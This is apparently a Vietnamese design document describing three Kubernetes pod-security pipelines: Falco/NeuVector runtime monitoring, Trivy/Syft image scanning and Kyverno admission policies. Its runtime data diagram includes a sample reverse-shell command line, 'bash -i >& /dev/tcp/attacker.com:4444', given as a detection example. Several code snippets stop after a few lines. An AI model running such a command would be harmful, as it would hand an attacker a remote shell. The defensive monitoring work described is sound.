TỔNG HỢP 3 LUỒNG XỬ LÝ TIN SECURITY CỦA POD KUBERNETES
LUỒNG 1️⃣: RUNTIME SECURITY (Falco + NeuVector)
Định Nghĩa
Giám sát hành vi thực thi của container tại thời điểm chạy, phát hiện các hoạt động nguy hiểm hoặc bất thường trong runtime.

Dữ Liệu Được Thu Thập
Code
┌──────────────────────────────────────────────────────────────┐
│           RUNTIME SECURITY - DATA COLLECTION                 │
├────────────────��─────────────────────────────────────────────┤
│                                                               │
│ 1. System Call Events (từ Kernel via eBPF)                  │
│    ├── Process Management                                    │
│    │   ├── execve() - Thực thi tiến trình                   │
│    │   ├── fork()/clone() - Tạo tiến trình con             │
│    │   └── exit() - Kết thúc tiến trình                    │
│    │                                                         │
│    ├── File Operations                                       │
│    │   ├── open(file) - Mở file                            │
│    │   ├── write(file) - Ghi vào file                      │
│    │   ├── unlink(file) - Xoá file                         │
│    │   ├── chmod(file) - Thay đổi quyền                    │
│    │   └── mmap() - Ánh xạ bộ nhớ                          │
│    │                                                         │
│    ├── Network Operations                                    │
│    │   ├── socket() - Tạo socket                           │
│    │   ├── connect(ip:port) - Kết nối                      │
│    │   ├── bind(port) - Gắn port                           │
│    │   ├── listen() - Nghe port                            │
│    │   └── sendto()/recvfrom() - Gửi/nhận                  │
│    │                                                         │
│    └── IPC Operations                                        │
│        ├── pipe() - Tạo pipeline                           │
│        ├── mmap() - Bộ nhớ chia sẻ                         │
│        └── signal() - Gửi tín hiệu                         │
│                                                              │
│ 2. Container & Pod Context Enrichment                        │
│    ├── Container ID: abc123def456                           │
│    ├── Container Name: my-app                               │
│    ├── Image Reference: myregistry.io/my-app:v1.0.0        │
│    ├── Image Digest: sha256:...                            │
│    ├── Pod Name: my-app-pod-1                              │
│    ├── Pod Namespace: default                               │
│    ├── Pod Labels: [app=myapp, version=v1]                 │
│    ├── Pod Annotations: [...]                              │
│    ├── Service Account: my-app-sa                          │
│    ├── Node Name: k8s-worker-1                             │
│    └── Node IP: 192.168.1.100                              │
│                                                              │
│ 3. Process Tree Information                                  │
│    ├── Process ID: 12345                                   │
│    ├── Parent Process: python (PID: 123)                   │
│    ├── Process Name: bash                                  │
│    ├── Command Line: bash -i >& /dev/tcp/attacker.com:4444│
│    ├── Working Directory: /app                             │
│    ├── Process Arguments: [bash, -i]                       │
│    ├── Environment Variables: [PATH=/bin, USER=app]        │
│    ├── User/UID: appuser (1000)                            │
│    ├── Process State: running/zombie                       │
│    └── Created Time: 2026-03-23T14:23:45Z                  │
│                                                              │
│ 4. File System Activity                                      │
│    ├── File Access Patterns                                │
│    │   ├── Sensitive Files: /etc/passwd, /etc/shadow       │
│    │   ├── Binary Access: /usr/bin/curl, /usr/bin/wget    │
│    │   ├── Config Access: /etc/config, /.aws/credentials  │
│    │   └── Log Access: /var/log/syslog                    │
│    │                                                         │
│    ├── File Modifications                                  │
│    │   ├── File Write Locations: /tmp, /dev/shm           │
│    │   ├── Binary Modifications: /usr/bin/*               │
│    │   ├── Permission Changes: chmod changes              │
│    │   └── Ownership Changes: chown changes               │
│    │                                                         │
│    └── Directory Operations                                │
│        ├── Directory Listing: ls -la /etc                 │
│        ├── Directory Traversal: cd ../../../              │
│        └── Directory Creation: mkdir /tmp/malware         │
│                                                              │
│ 5. Network Activity Tracking                                 │
│    ├── Outbound Connections                               │
│    │   ├── Destination IP: 203.0.113.50                  │
│    │   ├── Destination Port: 4444                         │
│    │   ├── Protocol: TCP/UDP                              │
│    │   └── Connection State: ESTABLISHED/LISTEN          │
│    │                                                         │
│    ├── Network Anomalies                                  │
│    │   ├── Port Scanning: nmap scan patterns             │
│    │   ├── DNS Queries: nslookup attacker.com            │
│    │   ├── Data Exfiltration: Large data transfer        │
│    │   └── Reverse Shell: connect to attacker command   │
│    │                                                         │
│    └── Network Flows                                       │
│        ├── Source IP: 192.168.1.100                      │
│        ├── Source Port: 54321                             │
│        ├── Destination: 203.0.113.50:4444                │
│        └── Bytes Sent/Received: 1024KB/2048KB            │
│                                                              │
│ 6. Capability & Permission Tracking                         │
│    ├── Linux Capabilities: CAP_NET_RAW, CAP_SYS_ADMIN    │
│    ├── Privilege Escalation: setuid attempts             │
│    ├── UID/GID Changes: su, sudo commands                │
│    └── Capability Drops: CAP_ALL set                     │
│                                                              │
│ 7. Resource & Performance Metrics                           │
│    ├── CPU Usage: 45%                                     │
│    ├── Memory Usage: 256MB / 512MB limit                  │
│    ├── File Descriptors: 24/1024                          │
│    ├── Network Bandwidth: 100Mbps                         │
│    └── Syscall Event Rate: 5000/sec                       │
│                                                              │
└──────────────────────────────────────────────────────────────┘
Cách Thực Hiện (Execution Code)
falco_runtime_monitoring.cpp
// File: userspace/engine/falco_engine.h
// Falco Event Processing Loop

void falco_engine::process_event(sinsp_evt* ev) {
    // 1. Extract syscall information
    uint64_t timestamp = ev->get_ts();           // Thời gian sự kiện
Dữ Liệu Output: Falco Alert Example
falco_runtime_alert.json
{
  "time": "2026-03-23T14:23:45.123456Z",
  "severity": "CRITICAL",
  "rule": "Suspicious Process Spawn - Reverse Shell",
  "container": {
    "id": "abc123def456",
Các Metric & KPI
Metric	Mô Tả	Threshold
Event Drop Rate	% sự kiện bị mất do overload	< 1%
Alert Latency	Thời gian từ sự kiện → alert	< 100ms
Rule Match Rate	Số rule triggered / total syscalls	< 0.1%
Syscall Rate	Số syscall/sec trong container	< 10,000/sec
False Positive Rate	Số alert sai / total alerts	< 5%
LUỒNG 2️⃣: POD DETAILS (Trivy + Syft + Container Registry)
Định Nghĩa
Quét chi tiết cấu trúc pod, hình ảnh container, dependencies, vulnerabilities và SBOM (Software Bill of Materials) tại thời điểm build/deployment.

Dữ Liệu Được Thu Thập
Code
┌──────────────────────────────────────────────────────────────┐
│         POD DETAILS - DATA COLLECTION & ANALYSIS              │
├──────────────────────────────────────────────────────────────┤
│                                                               │
│ 1. Pod Specification Details                                │
│    ├── Pod Metadata                                         │
│    │   ├── Name: my-app-pod-1                               │
│    │   ├── Namespace: default                               │
│    │   ├── UID: 550e8400-e29b-41d4-a716-446655440000       │
│    │   ├── Labels: {app: myapp, version: v1}               │
│    │   ├── Annotations: {deployed-by: terraform}           │
│    │   └── Creation Timestamp: 2026-03-23T10:00:00Z        │
│    │                                                         │
│    ├── Pod Spec Configuration                              │
│    │   ├── Service Account: my-app-sa                      │
│    │   ├── Restart Policy: Always                          │
│    │   ├── DNS Policy: ClusterFirst                        │
│    │   ├── Security Context                                │
│    │   │   ├── Run As User: 1000                           │
│    │   │   ├── Run As Group: 1000                          │
│    │   │   ├── FS Group: 2000                              │
│    │   │   └── SE Linux Options: ...                       │
│    │   ├── Host Network: false                             │
│    │   ├── Host PID: false                                 │
│    │   ├── Host IPC: false                                 │
│    │   └── Share Process Namespace: false                  │
│    │                                                         │
│    └── Tolerations & Affinity                              │
│        ├── Node Selector: disk=ssd                         │
│        ├── Affinity Rules: pod-anti-affinity               │
│        └── Taints: [dedicated=backend:NoSchedule]         │
│                                                              │
│ 2. Container Details (Multiple Containers)                 │
│    ├── Container 0: app                                    │
│    │   ├── Image Information                               │
│    │   │   ├── Registry: myregistry.io                     │
│    │   │   ├── Repository: my-app                          │
│    │   │   ├── Tag: v1.0.0                                 │
│    │   │   ├── Full Reference: myregistry.io/my-app:v1.0.0│
│    │   │   ├── Digest: sha256:abc123...                    │
│    │   │   ├── Image Size: 245.3 MB                        │
│    │   │   ├── Layers: 12                                  │
│    │   │   └── Build Date: 2026-03-15T08:30:00Z           │
│    │   │                                                    │
│    │   ├── Container Runtime Info                          │
│    │   │   ├── Container ID: abc123def456...              │
│    │   │   ├── Runtime: containerd                         │
│    │   │   ├── Memory Limit: 512Mi                         │
│    │   │   ├── Memory Request: 128Mi                       │
│    │   │   ├── CPU Limit: 500m                             │
│    │   │   ├── CPU Request: 100m                           │
│    │   │   ├── Disk Quota: 5Gi                             │
│    │   │   └── Ephemeral Storage: 1Gi                      │
│    │   │                                                    │
│    │   ├── Security Context                                │
│    │   │   ├── Privileged: false                           │
│    │   │   ├── Run As User: 1000                           │
│    │   │   ├── Run As Non-Root: true                       │
│    │   │   ├── ReadOnly Root Filesystem: true              │
│    │   │   ├── Allow Privilege Escalation: false           │
│    │   │   ├── Capabilities: {drop: [ALL]}                │
│    │   │   ├── Seccomp: RuntimeDefault                     │
│    │   │   ├── SELinux: type: spc_t                        │
│    │   │   ├── AppArmor: docker-default                    │
│    │   │   └── Windows Options: (if applicable)            │
│    │   │                                                    │
│    │   ├── Ports & Networking                              │
│    │   │   ├── Port 8080/TCP (http)                        │
│    │   │   ├── Port 8443/TCP (https)                       │
│    │   │   └── Port 9090/TCP (metrics)                     │
│    │   │                                                    │
│    │   ├── Environment Variables                           │
│    │   │   ├── APP_ENV: production                         │
│    │   │   ├── LOG_LEVEL: info                             │
│    │   │   ├── DB_HOST: postgres.default.svc               │
│    │   │   ├── DB_PORT: 5432                               │
│    │   │   ├── DB_USER: app_user (valueFrom: secret)      │
│    │   │   └── API_KEY: (valueFrom: configmap)            │
│    │   │                                                    │
│    │   ├── Volume Mounts                                   │
│    │   │   ├── /app (emptyDir)                             │
│    │   │   ├── /tmp (emptyDir)                             │
│    │   │   ├── /etc/config (configMap)                     │
│    │   │   ├── /var/secrets (secret)                       │
│    │   │   ├── /data (persistentVolumeClaim)               │
│    │   │   └── /proc (procfs, readOnly)                    │
│    │   │                                                    │
│    │   ├── Liveness/Readiness Probes                       │
│    │   │   ├── Liveness: HTTP GET /health:8080            │
│    │   │   │   ├── Initial Delay: 30s                      │
│    │   │   │   ├── Period: 10s                             │
│    │   │   │   └── Timeout: 5s                             │
│    │   │   │                                                │
│    │   │   └── Readiness: HTTP GET /ready:8080            │
│    │   │       ├── Initial Delay: 5s                       │
│    │   │       ├── Period: 5s                              │
│    │   │       └── Timeout: 3s                             │
│    │   │                                                    │
│    │   └── Lifecycle Hooks                                 │
│    │       ├── preStop: /bin/sleep 15                      │
│    │       └── postStart: /bin/sh -c startup.sh            │
│    │                                                        │
│    └── [Other containers: init-container, sidecar, etc]   │
│                                                              │
│ 3. Image Layer Analysis                                     │
│    ├── Base Image                                          │
│    │   ├── Name: ubuntu:22.04                              │
│    │   ├── Layer Digest: sha256:abc...                     │
│    │   ├── OS: Linux                                       │
│    │   ├── Distro: Ubuntu 22.04 LTS                        │
│    │   └── Distro Version ID: 22.04                        │
│    │                                                        │
│    ├── Layer-by-Layer Analysis                             │
│    │   ├── Layer 1 (Base): 77MB                            │
│    │   │   └── OS Packages: libc, openssl, curl, etc      │
│    │   ├── Layer 2 (Runtime): 45MB                         │
│    │   │   └── JRE/Python/Node installation                │
│    │   ├── Layer 3 (Dependencies): 89MB                     │
│    │   │   └── npm/pip/maven packages                      │
│    │   ├── Layer 4 (Application): 34MB                     │
│    │   │   └── App binary + config files                   │
│    │   └── Layer 5 (Distroless): 5KB                       │
│    │       └── Final runtime skeleton                      │
│    │                                                        │
│    └── Layer Audit                                         │
│        ├── Modified Files: 156                             │
│        ├── New Files: 2,341                                │
│        ├── Deleted Files: 23                               │
│        └── Permission Changes: 45                          │
│                                                              │
│ 4. Operating System & Packages                             │
│    ├── OS Information                                      │
│    │   ├── Distro: Ubuntu 22.04 LTS                        │
│    │   ├── Kernel: Linux 5.15.0                            │
│    │   ├── Libc: glibc 2.35                                │
│    │   └── Shell: bash 5.1                                 │
│    │                                                        │
│    ├── System Packages (OS-level)                          │
│    │   ├── openssl/1.1.1 → CVE-2023-0286 (CRITICAL)       │
│    │   ├── zlib/1.2.11 → OK                                │
│    │   ├── curl/7.81.0 → CVE-2023-27535 (HIGH)            │
│    │   ├── wget/1.21.2 → OK                                │
│    │   ├── git/2.34.1 → CVE-2023-22490 (MEDIUM)           │
│    │   └── [156 more packages]                             │
│    │                                                        │
│    └── Vulnerability Summary (OS)                          │
│        ├── CRITICAL: 3                                     │
│        ├── HIGH: 12                                        │
│        ├── MEDIUM: 34                                      │
│        └── LOW: 89                                         │
│                                                              │
│ 5. Application Dependencies                                │
│    ├── Language: Python 3.10                               │
│    │   ├── Flask/2.2.0 → OK                                │
│    │   ├── sqlalchemy/2.0.0 → CVE-2023-0001 (HIGH)       │
│    │   ├── requests/2.28.0 → CVE-2023-27536 (MEDIUM)     │
│    │   ├── python-dotenv/0.20.0 → OK                       │
│    │   ├── gunicorn/20.1.0 → OK                            │
│    │   └── [89 more packages]                              │
│    │                                                        │
│    ├── Vulnerability Summary (Libraries)                   │
│    │   ├── CRITICAL: 1                                     │
│    │   ├── HIGH: 8                                         │
│    │   ├── MEDIUM: 21                                      │
│    │   └── LOW: 67                                         │
│    │                                                        │
│    └── Dependency Tree                                     │
│        ├── Flask 2.2.0                                     │
│        │   ├── Werkzeug 2.2.0                              │
│        │   ├── Jinja2 3.1.0                                │
│        │   └── Click 8.1.0                                 │
│        └── SQLAlchemy 2.0.0                                │
│            ├── greenlet 1.1.0                              │
│            └── typing-extensions 4.5.0                     │
│                                                              │
│ 6. Supply Chain & Metadata                                 │
│    ├── Image Metadata                                      │
│    │   ├── Created: 2026-03-15T08:30:00Z                   │
│    │   ├── Author: devops-team@company.com                 │
│    │   ├── Maintainer: platform-team                       │
│    │   ├── URL: https://github.com/company/my-app         │
│    │   ├── Documentation: https://docs.myapp.io            │
│    │   ├── Source: https://github.com/company/my-app.git  │
│    │   └── License: Apache-2.0                             │
│    │                                                        │
│    ├── Build Information                                   │
│    │   ├── Build Tool: Docker                              │
│    │   ├── Build Date: 2026-03-15T08:30:00Z                │
│    │   ├── Git Commit: abc123def456...                     │
│    │   ├── Git Branch: main                                │
│    │   ├── CI/CD Pipeline: GitHub Actions                  │
│    │   └── Build ID: runs/12345678                         │
│    │                                                        │
│    └── Image Signature & Attestation                       │
│        ├── Signed: true                                    │
│        ├── Signature Type: Cosign                          │
│        ├── Signer: signing-key-prod                        │
│        ├── Signature Digest: sha256:xyz...                 │
│        ├── Attestations                                    │
│        │   ├── intoto Attestation: Present                │
│        │   ├── SLSA Provenance: v1.0                       │
│        │   └── SBOM Attestation: CycloneDX                 │
│        └── Verification Status: PASSED                     │
│                                                              │
│ 7. Image Pull Secrets & Registry Auth                      │
│    ├── Pull Secret Name: myregistry-secret                 │
│    ├── Registry Host: myregistry.io                        │
│    ├── Auth Type: Bearer Token                             │
│    ├── Token Expires: 2026-04-23T10:00:00Z                 │
│    ├── Pull Failures: 0                                    │
│    └── Last Pull: 2026-03-23T11:00:00Z                     │
│                                                              │
└──────────────────────────────────────────────────────────────┘
Cách Thực Hiện (Execution Code)
trivy_sbom_extraction.go
// File: Trivy + Syft Integration

package scanner

import (
    "github.com/aquasecurity/trivy/pkg/scanner"
Output: Trivy Scan Results
trivy_scan_results.json
{
  "artifact_type": "container_image",
  "artifact_name": "myregistry.io/my-app:v1.0.0",
  "image_metadata": {
    "digest": "sha256:abc123def456...",
    "created": "2026-03-15T08:30:00Z",
LUỒNG 3️⃣: POLICY-AS-CODE ENFORCEMENT (Kyverno)
Định Nghĩa
Thực thi các chính sách bảo mật, tuân thủ quy tắc tại thời điểm admission (trước pod được tạo) thông qua rule-based engine.

Dữ Liệu Được Thu Thập & Xử Lý
Code
┌──────────────────────────────────────────────────────────────┐
│     POLICY-AS-CODE ENFORCEMENT - KYVERNO                      │
├──────────────────────────────────────────────────────────────┤
│                                                               │
│ 1. Admission Request Interception                            │
│    ├── Request Metadata                                      │
│    │   ├── UID: 550e8400-e29b-41d4-a716-446655440000       │
│    │   ├── Kind: Pod/Deployment/StatefulSet                 │
│    │   ├── Namespace: default                                │
│    │   ├── Name: my-app-pod-1                               │
│    │   ├── Operation: CREATE/UPDATE/DELETE                  │
│    │   ├── RequestKind: Pod                                 │
│    │   ├── Timestamp: 2026-03-23T10:00:00Z                  │
│    │   └── DryRun: false                                    │
│    │                                                         │
│    ├── User Information                                      │
│    │   ├── Username: developer@company.com                  │
│    │   ├── UID: user-123                                    │
│    │   ├── Groups: [developers, platform-team]              │
│    ��   ├── Roles: [developer, pod-creator]                 │
│    │   ├── ClusterRoles: [view, edit]                       │
│    │   └── Extra: {organization: company}                   │
│    │                                                         │
│    └── Request Objects                                      │
│        ├── Object (New Pod): {...full spec...}              │
│        ├── OldObject (Previous, if update): {...}           │
│        └── Options (CreateOptions): {...}                   │
│                                                              │
│ 2. Resource Pattern Matching & Filtering                    │
│    ├── Resource Matching                                    │
│    │   ├── Kind: Pod matches "Pod" rule ✓                  │
│    │   ├── Namespace: default matches "default|prod" ✓     │
│    │   ├── Name: my-app-pod matches "my-app-*" ✓          │
│    │   ├── Labels: {app: myapp} matches selector ✓         │
│    │   └── Annotations: {} matches pattern ✓               │
│    │                                                         │
│    ├── User/Role Filtering                                  │
│    │   ├── ExcludeGroups: [system:masters] - Not matched   │
│    │   ├── ExcludeRoles: [admin] - Not matched             │
│    │   ├── ExcludeServiceAccounts: [system:*] - Not matched│
│    │   └── User Principal: developer@company.com ✓         │
│    │                                                         │
│    └── Namespace Filtering                                  │
│        ├── NSSelector: {tier: production} ✓                 │
│        ├── NSLabels: checked from namespace-lister          │
│        └── Excluded NS: [kube-*, kyverno] - Not in list    │
│                                                              │
│ 3. Policy Rule Evaluation                                   │
│    ├── Validate Rules (Admission Prevention)                │
│    │   ├── Rule: require-image-pull-policy                 │
│    │   │   ├── Type: Validation                             │
│    │   │   ├── FailureAction: Enforce (block)              │
│    │   │   ├── Pattern: image pull policy = Always          │
│    │   │   ├── Message: "Image pull policy must be Always" │
│    │   │   └── Status: [PASS/FAIL/SKIP]                    │
│    │   │                                                    │
│    │   ├── Rule: require-security-context                  │
│    │   │   ├── Pattern: securityContext.runAsNonRoot = true│
│    │   │   ├── Pattern: securityContext.privileged = false │
│    │   │   ├── Pattern: securityContext.readOnlyRootFS     │
│    │   │   └── Status: [PASS/FAIL/SKIP]                    │
│    │   │                                                    │
│    │   ├── Rule: require-resource-limits                   │
│    │   │   ├── Pattern: containers[*].resources.limits set │
│    │   │   ├── Pattern: containers[*].resources.requests   │
│    │   │   └── Status: [PASS/FAIL/SKIP]                    │
│    │   │                                                    │
│    │   └── Rule: allowed-registries                        │
│    │       ├── Pattern: image matches whitelist registry    │
│    │       ├── Allowed: [myregistry.io/*, docker.io/lib*]  │
│    │       └── Status: [PASS/FAIL/SKIP]                    │
│    │                                                         │
│    ├── Mutate Rules (Automatic Transformation)              │
│    │   ├── Rule: add-network-policy                        │
│    │   │   ├── Type: Mutation (JSONPatch)                   │
│    │   │   ├── Target: pods in namespace with label tier=prod
│    │   │   ├── Patch: add pod annotations for network policy
│    │   │   └── Applied: Add annotation "network=restricted"│
│    │   │                                                    │
│    │   ├── Rule: inject-sidecar                            │
│    │   │   ├── Type: Mutation (StrategicMergePatch)        │
│    │   │   ├── Patch: Insert monitoring sidecar container  │
│    │   │   ├── Sidecar: {image: prometheus-exporter:v1}    │
│    │   │   └── Applied: Sidecar injected                   │
│    │   │                                                    │
│    │   └── Rule: image-mutation-to-digest                  │
│    │       ├── Type: Mutation + Image Verification         │
│    │       ├── From: myregistry.io/my-app:v1.0.0          │
│    │       ├── To: myregistry.io/my-app:sha256:abc123...  │
│    │       └── Applied: Image replaced with digest         │
│    │                                                         │
│    └── Image Verification Rules (Signature Check)           │
│        ├── Rule: verify-image-signature                    │
│        │   ├── Type: Image Verification (Cosign)           │
│        │   ├── ImageRef: myregistry.io/my-app:*           │
│        │   ├── VerificationType: Cosign                     │
│        │   ├── Attestors: [prod-signer, ci-pipeline]      │
│        │   ├── FailureAction: Enforce (block if invalid)   │
│        │   ├── MutateDigest: true                           │
│        │   ├── Signature Check: PASSED/FAILED              │
│        │   └── Status: [VERIFIED/NOT_VERIFIED]             │
│        │                                                    │
│        └── Rule: verify-sbom-attestation                   │
│            ├── Attestation Type: SBOM (CycloneDX)          │
│            ├── Attestation Check: Present/Valid            │
│            └── Status: [VALIDATED/FAILED]                  │
│                                                              │
│ 4. Context Building & Variable Substitution                │
│    ├── Context Entries                                     │
│    │   ├── ConfigMap: app-config                           │
│    │   │   ├── Data: {allowed-repos: myregistry.io}       │
│    │   │   └── Available in rules as: config.data.*(key)   │
│    │   │                                                    │
│    │   ├── API Call: fetch user department                 │
│    │   │   ├── URL: /api/v1/users/developer@company.com   │
│    │   │   ├── Result: {department: platform-team}         │
│    │   │   └── Available as: api_request.department        │
│    │   │                                                    │
│    │   └── ImageRegistry: check image in registry          │
│    │       ├── Registry: myregistry.io                     │
│    │       ├── Image Digest: sha256:abc123...             │
│    │       └── Available as: image_registry.digest         │
│    │                                                         │
│    ├── Variable Replacement                                │
│    │   ├── request.object.metadata.name → my-app-pod-1    │
│    │   ├── request.object.spec.containers[0].image        │
│    │   ├── serviceAccount → my-app-sa                      │
│    │   ├── namespace → default                             │
│    │   └── username → developer@company.com                │
│    │                                                         │
│    └── CEL Expression Evaluation                            │
│        ├── Expression: object.spec.securityContext.runAsNonRoot
│        ├── Evaluation: true                                 │
│        ├── Match: object.spec.containers.exists(c,          │
│        │           c.image.startsWith('myregistry.io/'))   │
│        └── Result: true (image matches whitelist)          │
│                                                              │
│ 5. Validation Failure Analysis                             │
│    ├── Failure Action: Enforce                             │
│    │   ├── Mode: Block (deny request)                      │
│    │   ├── Response: AdmissionDenied                       │
│    │   ├── Message: "Security context runAsNonRoot required"
│    │   ├── Cause: Rule violation                           │
│    │   └── HTTP Status: 403 Forbidden                      │
│    │                                                         │
│    └── Failure Action: Audit                               │
│        ├── Mode: Allow (permit request)                    │
│        ├── Response: AdmissionAllowed (with warning)       │
│        ├── Message: "Warning: security best practice..."   │
│        ├── Logging: Log to PolicyReport                    │
│        └── HTTP Status: 200 OK (with warnings)             │
│                                                              │
│ 6. Auto-Generation & Pod Controllers                        │
│    ├── AutoGen Configuration                               │
│    │   ├── Enabled: true                                   │
│    │   ├── Controllers: [Deployment, StatefulSet, DaemonSet]
│    │   ├── ExcludeControllers: [CronJob]                   │
│    │   └── DetectControllers: true                         │
│    │                                                         │
│    └── Generated Rules                                      │
│        ├── Original: Rule applies to "Pod"                 │
│        ├── Generated: Rule applies to Deployment.spec.template.spec
│        ├── Generated: Rule applies to StatefulSet.spec.template.spec
│        └── Result: Pod policies auto-applied to controllers │
│                                                              │
│ 7. Policy Exception & Override                              │
│    ├── Policy Exceptions (PolicyException CR)               │
│    │   ├── Policy: require-image-pull-policy               │
│    │   ├── Rule: pull-policy-check                         │
│    │   ├── Namespace: staging                              │
│    │   ├── Selector: {app: legacy-app}                     │
│    │   ├── Time Range: until 2026-06-01                    │
│    │   ├── Match: pod matching exception criteria ✓        │
│    │   └── Result: SKIP this rule (exception applies)      │
│    │                                                         │
│    └── Failure Action Override                             │
│        ├── Policy: require-secure-image                    │
│        ├── Default: Enforce (block)                        │
│        ├── Override for ns: kube-system                    │
│        ├── Override Action: Audit (allow with warning)     │
│        └── Applied: Override replaces default action       │
│                                                              │
│ 8. Report Generation                                        │
│    ├── Admission Report                                    │
│    │   ├── Resource: my-app-pod-1                         │
│    │   ├── Namespace: default                              │
│    │   ├── Results:                                        │
│    │   │   ├── Rule: require-image-pull-policy → PASS     │
│    │   │   ├── Rule: require-security-context → FAIL      │
│    │   │   ├── Rule: require-resource-limits → PASS       │
│    │   │   └── Rule: verify-image-signature → PASS        │
│    │   ├── Overall: FAIL (1 rule failed)                  │
│    │   ├── Action Taken: DENIED (due to Enforce)          │
│    │   └── Timestamp: 2026-03-23T10:00:05Z                │
│    │                                                        │
│    └── Background Scan Report                              │
│        ├── Policy: require-image-pull-policy               │
│        ├── Scanned Resources: 542                          │
│        ├── Results:                                        │
│        │   ├── Pass: 536                                   │
│        │   ├── Fail: 6                                     │
│        │   └── Skip: 0                                     │
│        ├── Duration: 3.2s                                  │
│        └── Timestamp: 2026-03-23T11:00:00Z                 │
│                                                              │
│ 9. Mutation Output & Modified Resource                      │
│    ├── Original Pod Spec                                   │
│    │   └── containers[0].imagePullPolicy: IfNotPresent    │
│    │                                                        │
│    ├── Applied Mutations                                   │
│    │   ├── JSONPatch: replace imagePullPolicy → Always    │
│    │   ├── JSONPatch: add annotation network=restricted   │
│    │   ├── JSONPatch: add sidecar container               │
│    │   └── JSONPatch: replace image with digest           │
│    │                                                        │
│    └── Final Pod Spec (after mutations)                    │
│        ├── containers[0].imagePullPolicy: Always          │
│        ├── metadata.annotations: {network: restricted}    │
│        ├── spec.containers: [app, prometheus-exporter]    │
│        └── containers[0].image: myregistry.io/my-app:sha256:abc...
│                                                              │
└──────────────────────────────────────────────────────────────┘
Cách Thực Hiện (Execution Code)
kyverno_policy_enforcement.go
// File: pkg/webhooks/resource/handlers.go
// Kyverno Policy Enforcement Flow

func (h *resourceHandlers) Validate(
    ctx context.Context,
    logger logr.Logger,

## R5 Phase-2: Network queue spike anomaly (runtime)

- Capability mới tại Core: `NETWORK_TXRX_QUEUE_SPIKE`
- Điều kiện phát hiện:
  - baseline theo key `(container_name, dest_ip, dest_port, protocol)` trong cửa sổ thời gian gần nhất;
  - đủ số mẫu baseline tối thiểu;
  - queue hiện tại (`bytesSent + bytesRecv`, từ `tx_queue/rx_queue` proc net) vượt ngưỡng tối thiểu;
  - và lớn hơn `baseline_avg * multiplier`.
- Runtime event được ghi vào `runtime_events` với:
  - `syscall=connect`
  - `capability=NETWORK_TXRX_QUEUE_SPIKE`
  - `target_path=<dest_ip>:<dest_port> proto=<proto> q=<current> avg=<baseline>`

### Biến môi trường tuning

- `POD_DETAIL_NET_SPIKE_WINDOW_MINUTES` (mặc định `30`)
- `POD_DETAIL_NET_SPIKE_MIN_SAMPLES` (mặc định `5`)
- `POD_DETAIL_NET_SPIKE_MULTIPLIER` (mặc định `4.0`)
- `POD_DETAIL_NET_SPIKE_MIN_QUEUE_BYTES` (mặc định `4096`)

Ghi chú: `bytesSent/bytesRecv` hiện là snapshot `tx_queue/rx_queue` từ `/proc/net/*`, không phải cumulative flow bytes.